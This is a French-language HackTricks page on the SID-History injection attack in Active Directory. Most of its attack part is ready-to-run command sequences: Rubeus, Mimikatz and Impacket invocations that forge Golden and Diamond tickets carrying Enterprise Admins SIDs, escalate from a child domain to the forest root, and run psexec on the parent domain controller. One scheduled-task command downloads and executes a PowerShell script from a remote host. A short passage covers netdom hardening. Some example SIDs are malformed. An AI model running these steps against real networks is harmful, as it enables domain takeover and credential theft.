# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

L'objectif du **SID History Injection Attack** est de faciliter la **migration des utilisateurs entre les domaines** tout en garantissant un accès continu aux ressources de l'ancien domaine. Cela est réalisé en **intégrant l'ancien Security Identifier (SID) de l'utilisateur dans le SID History** de son nouveau compte. Il est important de noter que ce processus peut être détourné afin d'accorder un accès non autorisé, en ajoutant le SID d'un groupe hautement privilégié (tel que Enterprise Admins ou Domain Admins) du domaine parent au SID History. Cette exploitation donne accès à toutes les ressources du domaine parent.<sup>[[1]](#references)[[2]](#references)</sup>

Deux méthodes permettent d'exécuter cette attaque : la création d'un **Golden Ticket** ou d'un **Diamond Ticket**.

Pour trouver le SID du groupe **"Enterprise Admins"**, il faut d'abord identifier le SID du domaine racine. Une fois celui-ci identifié, le SID du groupe Enterprise Admins peut être construit en ajoutant `-519` au SID du domaine racine. Par exemple, si le SID du domaine racine est `S-1-5-21-280534878-1496970234-700767426`, le SID du groupe "Enterprise Admins" sera `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Vous pouvez également utiliser les groupes **Domain Admins**, dont le SID se termine par **512**.

Une autre manière de trouver le SID d'un groupe de l'autre domaine (par exemple "Domain Admins") consiste à utiliser :
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Notez qu'il est possible de désactiver l'historique SID dans une relation d'approbation, ce qui fera échouer cette attaque.

Selon la [**documentation**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Désactiver SIDHistory sur les approbations de forêt** à l'aide de l'outil netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Appliquer le SID Filter Quarantining aux approbations externes** à l'aide de l'outil netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Appliquer le SID Filtering aux approbations de domaine au sein d'une même forêt** n'est pas recommandé, car il s'agit d'une configuration non prise en charge pouvant entraîner des changements incompatibles. Si un domaine d'une forêt n'est pas digne de confiance, il ne devrait pas être membre de cette forêt. Dans ce cas, il est nécessaire de séparer d'abord les domaines de confiance et non fiables dans des forêts distinctes, où le SID Filtering pourra être appliqué à une approbation interforêts.

Consultez cet article pour plus d'informations sur le contournement de ce mécanisme : [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

La dernière fois que j'ai essayé, j'ai dû ajouter l'argument **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) avec KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Pour plus d’informations sur les golden tickets, consultez :


{{#ref}}
golden-ticket.md
{{#endref}}


Pour plus d’informations sur les diamond tickets, consultez :


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Escalate vers le DA du root ou l’Enterprise admin en utilisant le hash KRBTGT du domaine compromis :
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Avec les permissions obtenues grâce à l'attaque, vous pouvez par exemple exécuter une attaque DCSync dans le nouveau domaine :

{{#ref}}
dcsync.md
{{#endref}}

### Depuis Linux

#### Manuellement avec [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatiquement avec [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Il s'agit d'un script Impacket qui va **automatiser l'escalade du domaine enfant vers le domaine parent**. Le script nécessite :

- Le contrôleur de domaine cible
- Les identifiants d'un utilisateur administrateur du domaine enfant

Le processus est le suivant :

- Obtient le SID du groupe Enterprise Admins du domaine parent
- Récupère le hash du compte KRBTGT dans le domaine enfant
- Crée un Golden Ticket
- Se connecte au domaine parent
- Récupère les identifiants du compte Administrator dans le domaine parent
- Si le switch `target-exec` est spécifié, s'authentifie auprès du contrôleur de domaine du domaine parent via Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Références

- [1] [Persistance furtive dans Active Directory #14 : SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Qu'est-ce qu'un Security Identifier (SID) ? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Considérations de sécurité pour les relations d'approbation - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)

{{#include ../../banners/hacktricks-training.md}}
